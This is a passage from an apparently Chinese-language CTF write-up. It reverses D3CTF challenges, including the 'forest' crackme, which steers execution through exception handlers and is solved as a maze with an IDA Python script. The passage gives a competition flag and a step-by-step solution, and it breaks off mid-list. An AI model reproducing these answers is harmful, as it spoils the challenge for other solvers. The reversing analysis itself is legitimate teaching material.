^= <span class="hljs-number">7</span><br>flag[<span class="hljs-number">4</span>] = (flag[<span class="hljs-number">4</span>] &lt;&lt; <span class="hljs-number">7</span>) | (flag[<span class="hljs-number">4</span>] &gt;&gt; <span class="hljs-number">1</span>)<br>flag[<span class="hljs-number">4</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">3</span>] ^= flag[<span class="hljs-number">4</span>]<br>flag[<span class="hljs-number">3</span>] = (flag[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">6</span>) | (flag[<span class="hljs-number">3</span>] &gt;&gt; <span class="hljs-number">2</span>)<br>flag[<span class="hljs-number">3</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">2</span>] ^= flag[<span class="hljs-number">3</span>]<br>flag[<span class="hljs-number">2</span>] = (flag[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">5</span>) | (flag[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">3</span>)<br>flag[<span class="hljs-number">2</span>] &amp;= <span class="hljs-number">0xFF</span><br><br>flag[<span class="hljs-number">1</span>] ^= flag[<span class="hljs-number">2</span>]<br>flag[<span class="hljs-number">1</span>] ^= <span class="hljs-number">3</span><br>flag[<span class="hljs-number">1</span>] = (flag[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">3</span>) | (flag[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>)<br>flag[<span class="hljs-number">1</span>] &amp;= <span class="hljs-number">0xFF</span><br><br><span class="hljs-comment"># flag[0] ^= flag[1]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure><p>解密拿到flag<code>d3ctf&#123;m3owJumpVmvM&#125;</code></p><h2 id="forest"><a href="#forest" class="headerlink" title="forest"></a>forest</h2><p>main里面检查flag格式，把输入的17个字符转换称01字符串，末尾加0</p><p>重点在<code>sub_CE1F50</code>里面，把一段内存设置为可执行，然后触发<code>int 3</code>异常，使用<code>sub_CE1A00</code>函数（execption_handle）处理异常</p><p><img src="assets/2024-04-27-23-56-17-image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __thiscall <span class="hljs-title function_">execption_handle</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> **this)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *v3; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *v4; <span class="hljs-comment">// eax</span><br>  _DWORD *v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">void</span> **v8; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">void</span> **v15; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [esp+10h] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// [esp+14h] [ebp-28h]</span><br>  _DWORD *v18; <span class="hljs-comment">// [esp+18h] [ebp-24h]</span><br><br>  GetCurrentThreadId();<br>  result = **this;<br>  <span class="hljs-keyword">if</span> ( result &lt;= <span class="hljs-number">0xC0000005</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">0xC0000005</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">0x80000003</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">0x80000004</span> )<br>          <span class="hljs-keyword">return</span> result;<br>        v3 = this[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> ( ((v3[<span class="hljs-number">46</span>] - (_DWORD)&amp;code) &amp; <span class="hljs-number">0x3F</span>) == <span class="hljs-number">7</span> &amp;&amp; v3[<span class="hljs-number">44</span>] == <span class="hljs-number">1</span> )<br>          v3[<span class="hljs-number">46</span>] += <span class="hljs-number">0x17</span>;<br>        v4 = this[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">goto</span> LABEL_33;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( byte_CE6028 )<br>      &#123;<br>        byte_CE6028 = <span class="hljs-number">0</span>;<br>        R2 = (<span class="hljs-type">int</span>)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4u</span>);<br>        R1 = (<span class="hljs-type">int</span>)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4u</span>);<br>        v5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">4u</span>);<br>        v6 = R1;<br>        v7 = kk;<br>        v18 = v5;<br>        R0 = (<span class="hljs-type">int</span>)v5;<br>        *(_DWORD *)R1 = <span class="hljs-number">0</span>;<br>        *v5 = <span class="hljs-number">0</span>;<br>        v17 = v6;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)len &gt; v7 )<br>        &#123;<br>          v8 = &amp;flag;<br>          <span class="hljs-keyword">if</span> ( HIDWORD(len) &gt;= <span class="hljs-number">0x10</span> )<br>            v8 = (<span class="hljs-type">void</span> **)flag;<br>          v16 = R2;<br>          v9 = <span class="hljs-number">0</span>;<br>          *(_DWORD *)R2 = *((_BYTE *)v8 + v7) != <span class="hljs-number">0x30</span>;<br>          kk = v7 + <span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x483D</span>; ++i )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;code + i) == <span class="hljs-number">0xFF</span><br>              &amp;&amp; *((_BYTE *)&amp;code + i + <span class="hljs-number">1</span>) == <span class="hljs-number">0xFF</span><br>              &amp;&amp; *((_BYTE *)&amp;code + i + <span class="hljs-number">2</span>) == <span class="hljs-number">0xFF</span><br>              &amp;&amp; *((_BYTE *)&amp;code + i + <span class="hljs-number">3</span>) == <span class="hljs-number">0xFF</span> )<br>            &#123;<br>              v11 = v9 % <span class="hljs-number">5</span>;<br>              <span class="hljs-keyword">if</span> ( v9 % <span class="hljs-number">5</span> == <span class="hljs-number">1</span> || v11 == <span class="hljs-number">3</span> )<br>              &#123;<br>                v12 = v17;                      <span class="hljs-comment">// R1</span><br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">2</span> || v11 == <span class="hljs-number">4</span> )<br>              &#123;<br>                v12 = (<span class="hljs-type">int</span>)v18;                 <span class="hljs-comment">// R0</span><br>              &#125;<br>              <span class="hljs-keyword">else</span><br>              &#123;<br>                v12 = v16;                      <span class="hljs-comment">// R2</span><br>              &#125;<br>              *(_DWORD *)((<span class="hljs-type">char</span> *)&amp;code + i) = v12;<br>              ++v9;<br>              i += <span class="hljs-number">3</span>;<br>            &#125;<br>          &#125;<br>          this[<span class="hljs-number">1</span>][<span class="hljs-number">46</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;code;<br>          this[<span class="hljs-number">1</span>][<span class="hljs-number">48</span>] |= <span class="hljs-number">0x100</span>u;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>LABEL_39:<br>        sub_CE28B0();<br>      &#125;<br>      <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    right();<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">0xC0000096</span> )<br>    <span class="hljs-keyword">return</span> result;<br>  v13 = kk;<br>  v14 = *(_DWORD *)R1 + <span class="hljs-number">17</span> * *(_DWORD *)R0;<br>  <span class="hljs-keyword">if</span> ( kk &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)len )<br>  &#123;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">goto</span> LABEL_39;<br>  &#125;<br>  v15 = &amp;flag;<br>  <span class="hljs-keyword">if</span> ( HIDWORD(len) &gt;= <span class="hljs-number">0x10</span> )<br>    v15 = (<span class="hljs-type">void</span> **)flag;<br>  *(_DWORD *)R2 = *((_BYTE *)v15 + kk) != <span class="hljs-number">0x30</span>;<br>  kk = v13 + <span class="hljs-number">1</span>;<br>  this[<span class="hljs-number">1</span>][<span class="hljs-number">46</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;code + <span class="hljs-number">0x40</span> * v14;<br>  v4 = this[<span class="hljs-number">1</span>];<br>LABEL_33:<br>  v4[<span class="hljs-number">48</span>] |= <span class="hljs-number">0x100</span>u;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在execption_handle中根据异常码进行处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ksarm.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_ACCESS_VIOLATION 0xc0000005</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STAUSBREAKPOINT 0x80000003</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SINGLE_STEP 0x80000004</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_PRIVILEGED_INSTRUCTION 0xc0000096</span><br></code></pre></td></tr></table></figure><p>第一次<code>int 3</code>触发断点异常<code>0x80000003</code>，对应下面的异常处理代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (byte_CE6028)<br>&#123;<br>    byte_CE6028 = <span class="hljs-number">0</span>;<br>    R2 = (<span class="hljs-type">int</span>)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4u</span>);<br>    R1 = (<span class="hljs-type">int</span>)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4u</span>);<br>    v5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">4u</span>);<br>    v6 = R1;<br>    v7 = kk;<br>    v18 = v5;<br>    R0 = (<span class="hljs-type">int</span>)v5;<br>    *(_DWORD *)R1 = <span class="hljs-number">0</span>;<br>    *v5 = <span class="hljs-number">0</span>;<br>    v17 = v6;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)len &gt; v7)<br>    &#123;<br>        v8 = &amp;flag;<br>        <span class="hljs-keyword">if</span> (HIDWORD(len) &gt;= <span class="hljs-number">0x10</span>)<br>            v8 = (<span class="hljs-type">void</span> **)flag;<br>        v16 = R2;<br>        v9 = <span class="hljs-number">0</span>;<br>        *(_DWORD *)R2 = *((_BYTE *)v8 + v7) != <span class="hljs-number">0x30</span>;<br>        kk = v7 + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x483D</span>; ++i)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (*((_BYTE *)&amp;code + i) == <span class="hljs-number">0xFF</span> &amp;&amp; *((_BYTE *)&amp;code + i + <span class="hljs-number">1</span>) == <span class="hljs-number">0xFF</span> &amp;&amp; *((_BYTE *)&amp;code + i + <span class="hljs-number">2</span>) == <span class="hljs-number">0xFF</span> &amp;&amp; *((_BYTE *)&amp;code + i + <span class="hljs-number">3</span>) == <span class="hljs-number">0xFF</span>)<br>            &#123;<br>                v11 = v9 % <span class="hljs-number">5</span>;<br>                <span class="hljs-keyword">if</span> (v9 % <span class="hljs-number">5</span> == <span class="hljs-number">1</span> || v11 == <span class="hljs-number">3</span>)<br>                &#123;<br>                    v12 = v17; <span class="hljs-comment">// R1</span><br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v11 == <span class="hljs-number">2</span> || v11 == <span class="hljs-number">4</span>)<br>                &#123;<br>                    v12 = (<span class="hljs-type">int</span>)v18; <span class="hljs-comment">// R0</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    v12 = v16; <span class="hljs-comment">// R2</span><br>                &#125;<br>                *(_DWORD *)((<span class="hljs-type">char</span> *)&amp;code + i) = v12;<br>                ++v9;<br>                i += <span class="hljs-number">3</span>;<br>            &#125;<br>        &#125;<br>        this[<span class="hljs-number">1</span>][<span class="hljs-number">46</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;code;<br>        this[<span class="hljs-number">1</span>][<span class="hljs-number">48</span>] |= <span class="hljs-number">0x100</span>u;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>LABEL_39:<br>    sub_CE28B0();<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码只能执行一次，后续再触发<code>0x80000003</code>异常程序会结束运行，代码里面malloc了3个变量，并使用这3个变量替换code(前面修改了可执行权限的内存)中的<code>0xFFFFFFFF</code></p><p>R2的初值由<code>*(_DWORD *)R2 = *((_BYTE *)v8 + v7) != 0x30;</code>决定，这里是flag的第一个字符</p><p>将code初始化之后，<code>this[1][46] = (unsigned int)&amp;code;</code>修改线程结构体的EIP，使异常处理结束后程序进入到code中执行</p><p>分析一下code部分代码，code代码中包含很多的代码块，每一块的长度为0x40，根据前面修改的规律可以知道在code块中R0、R1、R2的位置固定</p><p><img src="assets/2024-04-28-10-42-40-image.png"></p><p>代码块中还有cli指令，由于cli指令是特权指令，ring3无法执行，因此运行到cli指令会触发<code>0xc0000096</code>异常，分析对应的处理代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">v13 = kk;<br>v14 = *(_DWORD *)R1 + <span class="hljs-number">17</span> * *(_DWORD *)R0;<br><span class="hljs-keyword">if</span> (kk &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)len)<br>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">goto</span> LABEL_39;<br>&#125;<br>v15 = &amp;flag;<br><span class="hljs-keyword">if</span> (HIDWORD(len) &gt;= <span class="hljs-number">0x10</span>)<br>    v15 = (<span class="hljs-type">void</span> **)flag;<br>*(_DWORD *)R2 = *((_BYTE *)v15 + kk) != <span class="hljs-number">0x30</span>;<br>kk = v13 + <span class="hljs-number">1</span>;<br>this[<span class="hljs-number">1</span>][<span class="hljs-number">46</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;code + <span class="hljs-number">0x40</span> * v14;<br>v4 = this[<span class="hljs-number">1</span>];<br>v4[<span class="hljs-number">48</span>] |= <span class="hljs-number">0x100</span>u;<br></code></pre></td></tr></table></figure><p>cli指令触发异常后，根据<code>R1+17*R0</code>的值确定下一个执行的代码块，修改EIP进入新的代码块，并且根据flag的01字符设置R2</p><p>结合code中的内容，在code代码中会设置R0、R1的值，接着使用cli触发异常，根据R0、R1的值选择下一个代码块，R2中储存了flag的一个bit</p><p>调试发现在code中还会触发<code>0x80000004</code>异常</p><p><img src="assets/2024-04-28-10-59-38-image.png"></p><p><img src="assets/2024-04-28-11-07-03-image.png"></p><p>跟踪一下发现这个异常是TF标志位造成的，TF标志位为1时，执行一条指令后就会触发<code>0x80000004</code>异常，在execption_handle中，返回时会设置<code>v4[48] |= 0x100u;</code>，这里设置的就是TF标志位</p><p>TF标志位触发异常后，会确定异常发生的位置，当异常发生位置为7，即<code>mov eax, [eax]</code>执行后，根据eax寄存器的确定是否进行跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (result != <span class="hljs-number">0x80000004</span>)<br>    <span class="hljs-keyword">return</span> result;<br>v3 = this[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (((v3[<span class="hljs-number">46</span>] - (_DWORD)&amp;code) &amp; <span class="hljs-number">0x3F</span>) == <span class="hljs-number">7</span> &amp;&amp; v3[<span class="hljs-number">44</span>] == <span class="hljs-number">1</span>)<br>    v3[<span class="hljs-number">46</span>] += <span class="hljs-number">0x17</span>;<br>v4 = this[<span class="hljs-number">1</span>];<br>v4[<span class="hljs-number">48</span>] |= <span class="hljs-number">0x100</span>u;<br></code></pre></td></tr></table></figure><p><img src="assets/2024-04-28-10-42-40-image.png"><br>结合跳转的位置和code中的代码，这里实际是根据R2进行调整，如果R2，即flag为1，跳转到下一个cli块中设置R1、R0，综合分析知道这里是根据flag的01值决定下一个代码块，在每一个代码块中有两个可跳转的位置</p><p>使用IDA Python解析代码块，获取每个代码块中的两个跳转位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> idaapi<br><br>image_base = idaapi.get_imagebase()<br>code_off = <span class="hljs-number">0x6030</span><br>code_size = <span class="hljs-number">0x4840</span><br><br><br>start = image_base + code_off<br>end = image_base + code_off + code_size<br><br>op_ls = [(-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x121</span>)]<br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x121</span>):<br>    ea = start + idx * <span class="hljs-number">0x40</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ea)&#125;</span>]: &quot;</span>)<br>    ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> (ins.startswith(<span class="hljs-string">&quot;mov     eax, 0FFFFFFFFh&quot;</span>)):<br>        op1 = idc.print_operand(ea+<span class="hljs-number">0x0C</span>, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> (op1[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;h&#x27;</span>):<br>            op1 = <span class="hljs-built_in">int</span>(op1[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">else</span>:<br>            op1 = <span class="hljs-built_in">int</span>(op1)<br>        op2 = idc.print_operand(ea+<span class="hljs-number">0x17</span>, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> (op2[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;h&#x27;</span>):<br>            op2 = <span class="hljs-built_in">int</span>(op2[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">else</span>:<br>            op2 = <span class="hljs-built_in">int</span>(op2)<br>        op3 = idc.print_operand(ea+<span class="hljs-number">0x23</span>, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> (op3[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;h&#x27;</span>):<br>            op3 = <span class="hljs-built_in">int</span>(op3[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">else</span>:<br>            op3 = <span class="hljs-built_in">int</span>(op3)<br>        op4 = idc.print_operand(ea+<span class="hljs-number">0x2E</span>, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> (op4[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;h&#x27;</span>):<br>            op4 = <span class="hljs-built_in">int</span>(op4[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">else</span>:<br>            op4 = <span class="hljs-built_in">int</span>(op4)<br>        ins = (op1+<span class="hljs-number">17</span>*op2, op3+<span class="hljs-number">17</span>*op4)<br>    <span class="hljs-keyword">elif</span> (ins.startswith(<span class="hljs-string">&quot;int     3&quot;</span>)):<br>        ins = (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(ins)<br>    op_ls[idx] = ins<br><br><span class="hljs-built_in">print</span>(op_ls)<br></code></pre></td></tr></table></figure><p>在解析时发现除了上面正常的代码块，还有下面几种代码块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">int     3</span><br><span class="hljs-string">add     [ecx-51h], ebx</span><br><span class="hljs-string">mov     eax, 1; mov     dword ptr [eax], 39393939h</span><br><span class="hljs-string">add     [ebp+28D5560Ah], ecx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>其中<code>int 3</code>触发<code>0x80000003</code>异常，由于该异常只能处理一次，所有遇到<code>int 3</code>的代码块会直接die掉</p><p>剩余3条指令会触发<code>0xC0000005</code>异常，该异常会进入right，输出正确信息</p><p>分析后可以知道本题其实是一道迷宫题，根据输入的flag决定走的路径，走到出口胜利</p><p>先找一下实际可到达的出口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">op_ls = [(<span class="hljs-number">11</span>, <span class="hljs-number">41</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">193</span>, <span class="hljs-number">52</span>), (<span class="hljs-number">7</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">216</span>, <span class="hljs-number">43</span>), (<span class="hljs-number">116</span>, <span class="hljs-number">13</span>), (<span class="hljs-number">120</span>, <span class="hljs-number">189</span>), (<span class="hljs-number">82</span>, <span class="hljs-number">244</span>), (<span class="hljs-number">12</span>, <span class="hljs-number">12</span>), (<span class="hljs-number">8</span>, <span class="hljs-number">15</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">72</span>, <span class="hljs-number">95</span>), (<span class="hljs-number">233</span>, <span class="hljs-number">272</span>), (<span class="hljs-number">211</span>, <span class="hljs-number">194</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">59</span>, <span class="hljs-number">230</span>), (<span class="hljs-number">237</span>, <span class="hljs-number">89</span>), (<span class="hljs-number">60</span>, <span class="hljs-number">190</span>), (<span class="hljs-number">23</span>, <span class="hljs-number">23</span>), (<span class="hljs-number">243</span>, <span class="hljs-number">232</span>), <span class="hljs-string">&#x27;add     [ecx-51h], ebx&#x27;</span>, (<span class="hljs-number">207</span>, <span class="hljs-number">224</span>), <span class="hljs-string">&#x27;mov     eax, 1&#x27;</span>, (<span class="hljs-number">31</span>, <span class="hljs-number">61</span>), (<span class="hljs-number">151</span>, <span class="hljs-number">179</span>), (<span class="hljs-number">12</span>, <span class="hljs-number">180</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">76</span>, <span class="hljs-number">147</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">153</span>, <span class="hljs-number">196</span>), (<span class="hljs-number">279</span>, <span class="hljs-number">271</span>), (-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>), (<span class="hljs-number">276</span>, <span 